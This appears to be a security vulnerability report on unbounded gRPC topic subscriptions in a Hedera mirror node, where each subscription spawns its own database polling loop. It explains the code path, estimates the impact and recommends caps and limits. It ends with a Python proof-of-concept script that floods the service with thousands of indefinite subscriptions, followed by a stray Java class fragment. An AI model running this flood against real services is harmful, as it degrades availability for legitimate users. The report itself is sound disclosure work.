### Title
Unbounded `PollingTopicListener` Subscriptions Enable DB-Amplified Griefing via Per-Subscription `PollingContext` State

### Summary
`PollingTopicListener.listen()` is a cold publisher that allocates a new `PollingContext` (holding `AtomicLong count` and `AtomicReference<TopicMessage> last`) and an independent database polling loop for every subscription. No global subscription cap exists; the only guard (`maxConcurrentCallsPerConnection = 5`) is scoped per TCP connection. An unprivileged attacker opening many connections can therefore spawn an unbounded number of independent DB polling loops, causing memory growth proportional to subscription count and a multiplicative amplification of database queries.

### Finding Description

**Code path:**

`PollingTopicListener.listen()` (lines 34–49) creates a fresh `PollingContext` on every invocation:

```java
// PollingTopicListener.java:35
PollingContext context = new PollingContext(filter);
```

`PollingContext` (lines 65–79) holds per-subscription mutable state:

```java
private final AtomicLong count = new AtomicLong(0L);
private final AtomicReference<@Nullable TopicMessage> last = new AtomicReference<>();
```

The returned `Flux` (lines 38–43) schedules a repeating DB poll every `interval` (default 500 ms) on a `boundedElastic` scheduler, independently for each subscriber:

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
```

`poll()` (lines 51–62) issues a `topicMessageRepository.findByFilter(newFilter)` DB query on every tick, per subscription.

**Root cause:** `listen()` is unconditionally cold — no shared state, no subscription registry, no cap on concurrent callers.

**Why existing checks fail:**

`NettyProperties.maxConcurrentCallsPerConnection` defaults to **5** and is enforced per TCP connection:

```java
// GrpcConfiguration.java:33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

This is trivially bypassed by opening multiple TCP connections. `TopicMessageServiceImpl` tracks `subscriberCount` only as a Micrometer gauge metric — it is never checked against a maximum:

```java
// TopicMessageServiceImpl.java:89-90
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

`TopicMessageFilter.isValidStartTime()` only requires `startTime <= now()`, so setting `startTime` to the current time is always valid and causes each `PollingContext` to start polling immediately with no historical backfill to bound its lifetime.

### Impact Explanation

With N connections × 5 calls each = 5N concurrent subscriptions:

- **DB amplification**: 5N independent `findByFilter` queries fire every 500 ms. At 1000 connections this is 5000 queries/500 ms = 10,000 queries/second against the database, with no back-pressure from the application layer.
- **Memory**: Each subscription holds a `PollingContext` plus the full Reactor `Flux` chain, scheduler task queue entries, and a live DB `Stream` handle per poll cycle. At scale this is non-trivial heap pressure.
- **Scheduler exhaustion**: `Schedulers.boundedElastic()` caps at `10 × CPU cores` threads; saturating it delays legitimate subscribers.
- **No economic cost to attacker**: gRPC connections are free; no Hedera transaction fees are involved.

Severity: **Medium** — service degradation / griefing with no direct economic damage to network users, matching the stated scope.

### Likelihood Explanation

Any client that can reach the gRPC port (default 5600) can exploit this. No authentication, no API key, and no per-IP connection limit is enforced in the visible code. The attacker needs only a script that opens TCP connections in a loop and calls `subscribeTopic` with `startTime = now()` and no `endTime` or `limit` (so subscriptions never self-terminate). This is trivially repeatable and automatable.

### Recommendation

1. **Enforce a global subscription cap**: Check `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and reject with `RESOURCE_EXHAUSTED` when exceeded.
2. **Enforce a per-IP or per-connection subscription limit** via a gRPC `ServerInterceptor`.
3. **Add `maxConnections` to `NettyServerBuilder`** alongside `maxConcurrentCallsPerConnection` to bound total TCP connections.
4. **Require `endTime` or `limit`** on subscriptions to `PollingTopicListener` so every subscription has a bounded lifetime, preventing indefinite polling loops.
5. **Consider making `PollingTopicListener` a hot/shared publisher** (like `SharedPollingTopicListener`) so N subscribers share one DB polling loop rather than each owning one.

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2
import time

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = basic_types_pb2.TopicID(topicNum=1)
NUM_CONNECTIONS = 500  # 500 connections × 5 calls = 2500 subscriptions

def flood_connection():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now = int(time.time())
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=timestamp_pb2.Timestamp(seconds=now),
        # no endTime, no limit → subscription never terminates
    )
    streams = []
    for _ in range(5):  # maxConcurrentCallsPerConnection default
        s = stub.subscribeTopic(query)
        streams.append(s)
    # Hold connections open indefinitely
    time.sleep(3600)

threads = [threading.Thread(target=flood_connection) for _ in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
# Result: 2500 independent PollingContext objects each issuing a DB query every 500ms
# = 5000 DB queries/second with zero application-layer rejection
```

    private class PollingContext {

        private final TopicMessageFilter filter;
        private final AtomicLong count = new AtomicLong(0L);
        private final AtomicReference<@Nullable TopicMessage> last = new AtomicReference<>();

        void onNext(TopicMessage topicMessage) {
            last.set(topicMessage);
            count.incrementAndGet();
        }

        private @Nullable TopicMessage getLast() {
            return last.get();
        }
    }
